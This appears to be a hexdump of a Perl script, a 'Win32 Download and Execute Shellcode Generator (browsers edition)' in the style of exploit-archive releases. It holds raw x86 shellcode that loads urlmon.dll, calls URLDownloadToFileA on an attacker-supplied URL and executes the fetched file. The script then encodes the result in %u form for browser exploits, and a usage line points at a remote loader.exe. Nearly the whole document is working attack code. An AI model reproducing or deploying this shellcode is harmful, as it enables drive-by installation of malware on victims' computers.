00000000  23 21 2f 75 73 72 2f 62  69 6e 2f 70 65 72 6c 0d  |#!/usr/bin/perl.|
00000010  0a 0d 0a 24 6c 6f 61 64  69 6e 67 5f 75 72 6c 3d  |...$loading_url=|
00000020  24 41 52 47 56 5b 30 5d  3b 0d 0a 63 68 6f 6d 70  |$ARGV[0];..chomp|
00000030  20 28 24 6c 6f 61 64 69  6e 67 5f 75 72 6c 29 3b  | ($loading_url);|
00000040  0d 0a 6d 79 20 40 62 75  66 66 65 72 3b 0d 0a 0d  |..my @buffer;...|
00000050  0a 69 66 20 28 24 6c 6f  61 64 69 6e 67 5f 75 72  |.if ($loading_ur|
00000060  6c 20 65 71 20 22 22 29  20 7b 0d 0a 24 73 63 6f  |l eq "") {..$sco|
00000070  20 3d 20 27 45 52 52 4f  52 21 21 21 20 45 6e 74  | = 'ERROR!!! Ent|
00000080  65 72 20 75 72 6c 20 74  6f 20 72 65 6d 6f 74 65  |er url to remote|
00000090  20 65 78 65 2e 27 3b 0d  0a 62 75 66 66 65 72 5f  | exe.';..buffer_|
000000a0  67 65 6e 28 24 73 63 6f  29 3b 0d 0a 70 72 69 6e  |gen($sco);..prin|
000000b0  74 20 40 62 75 66 66 65  72 3b 0d 0a 65 78 69 74  |t @buffer;..exit|
000000c0  3b 0d 0a 7d 0d 0a 0d 0a  24 63 3d 20 67 65 6e 65  |;..}....$c= gene|
000000d0  72 61 74 65 5f 63 68 61  72 28 30 29 3b 0d 0a 0d  |rate_char(0);...|
000000e0  0a 24 73 63 6f 3d 20 22  5c 78 45 38 5c 78 35 36  |.$sco= "\xE8\x56|
000000f0  5c 78 30 30 5c 78 30 30  5c 78 30 30 5c 78 35 33  |\x00\x00\x00\x53|
00000100  5c 78 35 35 5c 78 35 36  5c 78 35 37 5c 78 38 42  |\x55\x56\x57\x8B|
00000110  5c 78 36 43 5c 78 32 34  5c 78 31 38 5c 78 38 42  |\x6C\x24\x18\x8B|
00000120  5c 78 34 35 22 2e 0d 0a  20 20 20 20 20 20 22 5c  |\x45"...      "\|
00000130  78 33 43 5c 78 38 42 5c  78 35 34 5c 78 30 35 5c  |x3C\x8B\x54\x05\|
00000140  78 37 38 5c 78 30 31 5c  78 45 41 5c 78 38 42 5c  |x78\x01\xEA\x8B\|
00000150  78 34 41 5c 78 31 38 5c  78 38 42 5c 78 35 41 5c  |x4A\x18\x8B\x5A\|
00000160  78 32 30 5c 78 30 31 5c  78 45 42 22 2e 0d 0a 20  |x20\x01\xEB"... |
00000170  20 20 20 20 20 22 5c 78  45 33 5c 78 33 32 5c 78  |     "\xE3\x32\x|
00000180  34 39 5c 78 38 42 5c 78  33 34 5c 78 38 42 5c 78  |49\x8B\x34\x8B\x|
00000190  30 31 5c 78 45 45 5c 78  33 31 5c 78 46 46 5c 78  |01\xEE\x31\xFF\x|
000001a0  46 43 5c 78 33 31 5c 78  43 30 5c 78 41 43 5c 78  |FC\x31\xC0\xAC\x|
000001b0  33 38 22 2e 0d 0a 20 20  20 20 20 20 22 5c 78 45  |38"...      "\xE|
000001c0  30 5c 78 37 34 5c 78 30  37 5c 78 43 31 5c 78 43  |0\x74\x07\xC1\xC|
000001d0  46 5c 78 30 44 5c 78 30  31 5c 78 43 37 5c 78 45  |F\x0D\x01\xC7\xE|
000001e0  42 5c 78 46 32 5c 78 33  42 5c 78 37 43 5c 78 32  |B\xF2\x3B\x7C\x2|
000001f0  34 5c 78 31 34 5c 78 37  35 22 2e 0d 0a 20 20 20  |4\x14\x75"...   |
00000200  20 20 20 22 5c 78 45 31  5c 78 38 42 5c 78 35 41  |   "\xE1\x8B\x5A|
00000210  5c 78 32 34 5c 78 30 31  5c 78 45 42 5c 78 36 36  |\x24\x01\xEB\x66|
00000220  5c 78 38 42 5c 78 30 43  5c 78 34 42 5c 78 38 42  |\x8B\x0C\x4B\x8B|
00000230  5c 78 35 41 5c 78 31 43  5c 78 30 31 5c 78 45 42  |\x5A\x1C\x01\xEB|
00000240  22 2e 0d 0a 20 20 20 20  20 20 22 5c 78 38 42 5c  |"...      "\x8B\|
00000250  78 30 34 5c 78 38 42 5c  78 30 31 5c 78 45 38 5c  |x04\x8B\x01\xE8\|
00000260  78 45 42 5c 78 30 32 5c  78 33 31 5c 78 43 30 5c  |xEB\x02\x31\xC0\|
00000270  78 35 46 5c 78 35 45 5c  78 35 44 5c 78 35 42 5c  |x5F\x5E\x5D\x5B\|
00000280  78 43 32 5c 78 30 38 22  2e 0d 0a 20 20 20 20 20  |xC2\x08"...     |
00000290  20 22 5c 78 30 30 5c 78  35 45 5c 78 36 41 5c 78  | "\x00\x5E\x6A\x|
000002a0  33 30 5c 78 35 39 5c 78  36 34 5c 78 38 42 5c 78  |30\x59\x64\x8B\x|
000002b0  31 39 5c 78 38 42 5c 78  35 42 5c 78 30 43 5c 78  |19\x8B\x5B\x0C\x|
000002c0  38 42 5c 78 35 42 5c 78  31 43 5c 78 38 42 22 2e  |8B\x5B\x1C\x8B".|
000002d0  0d 0a 20 20 20 20 20 20  22 5c 78 31 42 5c 78 38  |..      "\x1B\x8|
000002e0  42 5c 78 35 42 5c 78 30  38 5c 78 35 33 5c 78 36  |B\x5B\x08\x53\x6|
000002f0  38 5c 78 38 45 5c 78 34  45 5c 78 30 45 5c 78 45  |8\x8E\x4E\x0E\xE|
00000300  43 5c 78 46 46 5c 78 44  36 5c 78 38 39 5c 78 43  |C\xFF\xD6\x89\xC|
00000310  37 5c 78 35 33 22 2e 0d  0a 20 20 20 20 20 20 22  |7\x53"...      "|
00000320  5c 78 36 38 5c 78 38 45  5c 78 34 45 5c 78 30 45  |\x68\x8E\x4E\x0E|
00000330  5c 78 45 43 5c 78 46 46  5c 78 44 36 5c 78 45 42  |\xEC\xFF\xD6\xEB|
00000340  5c 78 35 30 5c 78 35 41  5c 78 35 32 5c 78 46 46  |\x50\x5A\x52\xFF|
00000350  5c 78 44 30 5c 78 38 39  5c 78 43 32 22 2e 0d 0a  |\xD0\x89\xC2"...|
00000360  20 20 20 20 20 20 22 5c  78 35 32 5c 78 35 32 5c  |      "\x52\x52\|
00000370  78 35 33 5c 78 36 38 5c  78 41 41 5c 78 46 43 5c  |x53\x68\xAA\xFC\|
00000380  78 30 44 5c 78 37 43 5c  78 46 46 5c 78 44 36 5c  |x0D\x7C\xFF\xD6\|
00000390  78 35 41 5c 78 45 42 5c  78 34 44 5c 78 35 39 5c  |x5A\xEB\x4D\x59\|
000003a0  78 35 31 22 2e 0d 0a 20  20 20 20 20 20 22 5c 78  |x51"...      "\x|
000003b0  35 32 5c 78 46 46 5c 78  44 30 5c 78 45 42 5c 78  |52\xFF\xD0\xEB\x|
000003c0  37 32 5c 78 35 41 5c 78  45 42 5c 78 35 42 5c 78  |72\x5A\xEB\x5B\x|
000003d0  35 39 5c 78 36 41 5c 78  30 30 5c 78 36 41 5c 78  |59\x6A\x00\x6A\x|
000003e0  30 30 5c 78 35 31 5c 78  35 32 22 2e 0d 0a 20 20  |00\x51\x52"...  |
000003f0  20 20 20 20 22 5c 78 36  41 5c 78 30 30 5c 78 46  |    "\x6A\x00\xF|
00000400  46 5c 78 44 30 5c 78 35  33 5c 78 36 38 5c 78 41  |F\xD0\x53\x68\xA|
00000410  30 5c 78 44 35 5c 78 43  39 5c 78 34 44 5c 78 46  |0\xD5\xC9\x4D\xF|
00000420  46 5c 78 44 36 5c 78 35  41 5c 78 35 32 5c 78 46  |F\xD6\x5A\x52\xF|
00000430  46 22 2e 0d 0a 20 20 20  20 20 20 22 5c 78 44 30  |F"...      "\xD0|
00000440  5c 78 35 33 5c 78 36 38  5c 78 39 38 5c 78 46 45  |\x53\x68\x98\xFE|
00000450  5c 78 38 41 5c 78 30 45  5c 78 46 46 5c 78 44 36  |\x8A\x0E\xFF\xD6|
00000460  5c 78 45 42 5c 78 34 34  5c 78 35 39 5c 78 36 41  |\xEB\x44\x59\x6A|
00000470  5c 78 30 30 5c 78 35 31  22 2e 0d 0a 20 20 20 20  |\x00\x51"...    |
00000480  20 20 22 5c 78 46 46 5c  78 44 30 5c 78 35 33 5c  |  "\xFF\xD0\x53\|
00000490  78 36 38 5c 78 37 45 5c  78 44 38 5c 78 45 32 5c  |x68\x7E\xD8\xE2\|
000004a0  78 37 33 5c 78 46 46 5c  78 44 36 5c 78 36 41 5c  |x73\xFF\xD6\x6A\|
000004b0  78 30 30 5c 78 46 46 5c  78 44 30 5c 78 45 38 22  |x00\xFF\xD0\xE8"|
000004c0  2e 0d 0a 20 20 20 20 20  20 22 5c 78 41 42 5c 78  |...      "\xAB\x|
000004d0  46 46 5c 78 46 46 5c 78  46 46 5c 78 37 35 5c 78  |FF\xFF\xFF\x75\x|
000004e0  37 32 5c 78 36 43 5c 78  36 44 5c 78 36 46 5c 78  |72\x6C\x6D\x6F\x|
000004f0  36 45 5c 78 32 45 5c 78  36 34 5c 78 36 43 5c 78  |6E\x2E\x64\x6C\x|
00000500  36 43 5c 78 30 30 22 2e  0d 0a 20 20 20 20 20 20  |6C\x00"...      |
00000510  22 5c 78 45 38 5c 78 41  45 5c 78 46 46 5c 78 46  |"\xE8\xAE\xFF\xF|
00000520  46 5c 78 46 46 5c 78 35  35 5c 78 35 32 5c 78 34  |F\xFF\x55\x52\x4|
00000530  43 5c 78 34 34 5c 78 36  46 5c 78 37 37 5c 78 36  |C\x44\x6F\x77\x6|
00000540  45 5c 78 36 43 5c 78 36  46 5c 78 36 31 22 2e 0d  |E\x6C\x6F\x61"..|
00000550  0a 20 20 20 20 20 20 22  5c 78 36 34 5c 78 35 34  |.      "\x64\x54|
00000560  5c 78 36 46 5c 78 34 36  5c 78 36 39 5c 78 36 43  |\x6F\x46\x69\x6C|
00000570  5c 78 36 35 5c 78 34 31  5c 78 30 30 5c 78 45 38  |\x65\x41\x00\xE8|
00000580  5c 78 41 30 5c 78 46 46  5c 78 46 46 5c 78 46 46  |\xA0\xFF\xFF\xFF|
00000590  5c 78 32 45 22 2e 0d 0a  20 20 20 20 20 20 22 5c  |\x2E"...      "\|
000005a0  78 32 45 5c 78 35 43 22  2e 24 63 2e 22 5c 78 30  |x2E\x5C".$c."\x0|
000005b0  30 5c 78 45 38 5c 78 42  37 5c 78 46 46 5c 78 46  |0\xE8\xB7\xFF\xF|
000005c0  46 5c 78 46 46 5c 78 32  45 5c 78 32 45 5c 78 35  |F\xFF\x2E\x2E\x5|
000005d0  43 22 2e 24 63 2e 22 5c  78 30 30 22 2e 0d 0a 20  |C".$c."\x00"... |
000005e0  20 20 20 20 20 22 5c 78  45 38 5c 78 38 39 5c 78  |     "\xE8\x89\x|
000005f0  46 46 5c 78 46 46 5c 78  46 46 22 2e 24 6c 6f 61  |FF\xFF\xFF".$loa|
00000600  64 69 6e 67 5f 75 72 6c  2e 22 5c 78 30 30 22 3b  |ding_url."\x00";|
00000610  0d 0a 0d 0a 24 73 63 6f  3d 63 6f 6e 76 65 72 74  |....$sco=convert|
00000620  5f 73 63 6f 28 24 73 63  6f 29 3b 0d 0a 62 75 66  |_sco($sco);..buf|
00000630  66 65 72 5f 67 65 6e 28  24 73 63 6f 29 3b 0d 0a  |fer_gen($sco);..|
00000640  70 72 69 6e 74 20 40 62  75 66 66 65 72 3b 0d 0a  |print @buffer;..|
00000650  0d 0a 73 75 62 20 67 65  6e 65 72 61 74 65 5f 63  |..sub generate_c|
00000660  68 61 72 28 29 0d 0a 7b  0d 0a 20 6d 79 20 24 77  |har()..{.. my $w|
00000670  64 73 69 7a 65 20 3d 20  73 68 69 66 74 3b 0d 0a  |dsize = shift;..|
00000680  20 6d 79 20 40 61 6c 70  68 61 6e 75 6d 65 72 69  | my @alphanumeri|
00000690  63 20 3d 20 28 27 61 27  2e 2e 27 7a 27 29 3b 0d  |c = ('a'..'z');.|
000006a0  0a 20 6d 79 20 24 77 64  20 3d 20 6a 6f 69 6e 20  |. my $wd = join |
000006b0  27 27 2c 0d 0a 20 6d 61  70 20 24 61 6c 70 68 61  |'',.. map $alpha|
000006c0  6e 75 6d 65 72 69 63 5b  72 61 6e 64 20 40 61 6c  |numeric[rand @al|
000006d0  70 68 61 6e 75 6d 65 72  69 63 5d 2c 20 30 2e 2e  |phanumeric], 0..|
000006e0  24 77 64 73 69 7a 65 3b  0d 0a 20 20 72 65 74 75  |$wdsize;..  retu|
000006f0  72 6e 20 24 77 64 3b 0d  0a 7d 0d 0a 0d 0a 73 75  |rn $wd;..}....su|
00000700  62 20 63 6f 6e 76 65 72  74 5f 73 63 6f 20 7b 0d  |b convert_sco {.|
00000710  0a 20 20 20 20 20 20 20  20 6d 79 20 24 64 61 74  |.        my $dat|
00000720  61 20 3d 20 73 68 69 66  74 3b 0d 0a 20 20 20 20  |a = shift;..    |
00000730  20 20 20 20 6d 79 20 24  6d 6f 64 65 20 3d 20 73  |    my $mode = s|
00000740  68 69 66 74 28 29 20 7c  7c 20 27 4c 45 27 3b 0d  |hift() || 'LE';.|
00000750  0a 20 20 20 20 20 20 20  20 6d 79 20 24 63 6f 64  |.        my $cod|
00000760  65 20 3d 20 27 27 3b 0d  0a 0d 0a 20 20 20 20 20  |e = '';....     |
00000770  20 20 20 6d 79 20 24 69  64 78 20 3d 20 30 3b 0d  |   my $idx = 0;.|
00000780  0a 0d 0a 20 20 20 20 20  20 20 20 69 66 20 28 6c  |...        if (l|
00000790  65 6e 67 74 68 28 24 64  61 74 61 29 20 25 20 32  |ength($data) % 2|
000007a0  20 21 3d 20 30 29 20 7b  0d 0a 20 20 20 20 20 20  | != 0) {..      |
000007b0  20 20 20 20 20 20 20 20  20 20 24 64 61 74 61 20  |          $data |
000007c0  2e 3d 20 73 75 62 73 74  72 28 24 64 61 74 61 2c  |.= substr($data,|
000007d0  20 2d 31 2c 20 31 29 3b  0d 0a 20 20 20 20 20 20  | -1, 1);..      |
000007e0  20 20 7d 0d 0a 0d 0a 20  20 20 20 20 20 20 20 77  |  }....        w|
000007f0  68 69 6c 65 20 28 24 69  64 78 20 3c 20 6c 65 6e  |hile ($idx < len|
00000800  67 74 68 28 24 64 61 74  61 29 20 2d 20 31 29 20  |gth($data) - 1) |
00000810  7b 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |{..             |
00000820  20 20 20 6d 79 20 24 63  31 20 3d 20 6f 72 64 28  |   my $c1 = ord(|
00000830  73 75 62 73 74 72 28 24  64 61 74 61 2c 20 24 69  |substr($data, $i|
00000840  64 78 2c 20 31 29 29 3b  0d 0a 20 20 20 20 20 20  |dx, 1));..      |
00000850  20 20 20 20 20 20 20 20  20 20 6d 79 20 24 63 32  |          my $c2|
00000860  20 3d 20 6f 72 64 28 73  75 62 73 74 72 28 24 64  | = ord(substr($d|
00000870  61 74 61 2c 20 24 69 64  78 2b 31 2c 20 31 29 29  |ata, $idx+1, 1))|
00000880  3b 0d 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |;..             |
00000890  20 20 20 69 66 20 28 24  6d 6f 64 65 20 65 71 20  |   if ($mode eq |
000008a0  27 4c 45 27 29 20 7b 0d  0a 20 20 20 20 20 20 20  |'LE') {..       |
000008b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000008c0  20 24 63 6f 64 65 20 2e  3d 20 73 70 72 69 6e 74  | $code .= sprint|
000008d0  66 28 27 25 25 75 25 2e  32 78 25 2e 32 78 27 2c  |f('%%u%.2x%.2x',|
000008e0  20 24 63 32 2c 20 24 63  31 29 3b 0d 0a 20 20 20  | $c2, $c1);..   |
000008f0  20 20 20 20 20 20 20 20  20 20 20 20 20 7d 20 65  |             } e|
00000900  6c 73 65 20 7b 0d 0a 20  20 20 20 20 20 20 20 20  |lse {..         |
00000910  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 24  |               $|
00000920  63 6f 64 65 20 2e 3d 20  73 70 72 69 6e 74 66 28  |code .= sprintf(|
00000930  27 25 25 75 25 2e 32 78  25 2e 32 78 27 2c 20 24  |'%%u%.2x%.2x', $|
00000940  63 31 2c 20 24 63 32 29  3b 0d 0a 20 20 20 20 20  |c1, $c2);..     |
00000950  20 20 20 20 20 20 20 20  20 20 20 7d 0d 0a 20 20  |           }..  |
00000960  20 20 20 20 20 20 20 20  20 20 20 20 20 20 24 69  |              $i|
00000970  64 78 20 2b 3d 20 32 3b  0d 0a 20 20 20 20 20 20  |dx += 2;..      |
00000980  20 20 7d 0d 0a 0d 0a 20  20 20 20 20 20 20 20 72  |  }....        r|
00000990  65 74 75 72 6e 20 24 63  6f 64 65 3b 0d 0a 7d 0d  |eturn $code;..}.|
000009a0  0a 0d 0a 73 75 62 20 62  75 66 66 65 72 5f 67 65  |...sub buffer_ge|
000009b0  6e 28 29 7b 0d 0a 24 73  63 6f 20 3d 20 73 68 69  |n(){..$sco = shi|
000009c0  66 74 3b 0d 0a 40 62 75  66 66 65 72 3d 3c 3c 46  |ft;..@buffer=<<F|
000009d0  58 3b 0d 0a 0d 0a 20 20  20 20 57 69 6e 33 32 20  |X;....    Win32 |
000009e0  44 6f 77 6e 6c 6f 61 64  20 61 6e 64 20 45 78 65  |Download and Exe|
000009f0  63 75 74 65 20 53 68 65  6c 6c 63 6f 64 65 20 47  |cute Shellcode G|
00000a00  65 6e 65 72 61 74 6f 72  20 28 62 72 6f 77 73 65  |enerator (browse|
00000a10  72 73 20 65 64 69 74 69  6f 6e 29 0d 0a 20 20 20  |rs edition)..   |
00000a20  20 53 69 7a 65 3a 20 32  37 35 20 62 79 74 65 73  | Size: 275 bytes|
00000a30  20 2b 20 6c 6f 61 64 69  6e 67 5f 75 72 6c 0d 0a  | + loading_url..|
00000a40  20 20 20 20 41 75 74 68  6f 72 3a 20 59 61 67 20  |    Author: Yag |
00000a50  4b 6f 68 68 61 20 28 73  6b 79 68 6f 6c 65 20 5b  |Kohha (skyhole [|
00000a60  61 74 5d 20 67 6d 61 69  6c 2e 63 6f 6d 29 0d 0a  |at] gmail.com)..|
00000a70  20 20 20 20 0d 0a 20 20  20 20 55 73 61 67 65 3a  |    ..    Usage:|
00000a80  20 2e 2f 73 63 6f 20 68  74 74 70 3a 2f 2f 72 65  | ./sco http://re|
00000a90  6d 6f 74 65 5f 73 65 72  76 65 72 2f 6c 6f 61 64  |mote_server/load|
00000aa0  65 72 2e 65 78 65 0d 0a  20 20 20 20 0d 0a 20 20  |er.exe..    ..  |
00000ab0  20 20 47 72 65 65 74 7a  20 74 6f 3a 0d 0a 20 20  |  Greetz to:..  |
00000ac0  20 20 20 73 74 72 30 6b  65 20 5c 26 20 6d 69 6c  |   str0ke \& mil|
00000ad0  77 30 72 6d 20 70 72 6f  6a 65 63 74 0d 0a 20 20  |w0rm project..  |
00000ae0  20 20 20 73 68 69 6e 6e  61 69 0d 0a 20 20 20 20  |   shinnai..    |
00000af0  20 68 30 37 0d 0a 20 20  20 20 20 72 67 6f 64 0d  | h07..     rgod.|
00000b00  0a 20 20 20 20 20 48 2e  44 2e 20 4d 6f 6f 72 20  |.     H.D. Moor |
00000b10  5c 26 20 4d 65 74 61 73  70 6c 30 69 74 0d 0a 20  |\& Metaspl0it.. |
00000b20  20 20 20 20 6f 66 66 74  6f 70 69 63 0d 0a 20 20  |    offtopic..  |
00000b30  20 20 20 33 41 50 41 33  41 0d 0a 20 20 20 20 0d  |   3APA3A..    .|
00000b40  0a 2d 2d 2d 2d 2d 2d 2d  3e 20 53 74 61 72 74 0d  |.-------> Start.|
00000b50  0a 0d 0a 24 73 63 6f 0d  0a 0d 0a 2d 2d 2d 2d 2d  |...$sco....-----|
00000b60  2d 2d 3e 20 45 6e 64 0d  0a 46 58 0d 0a 0d 0a 7d  |--> End..FX....}|
00000b70
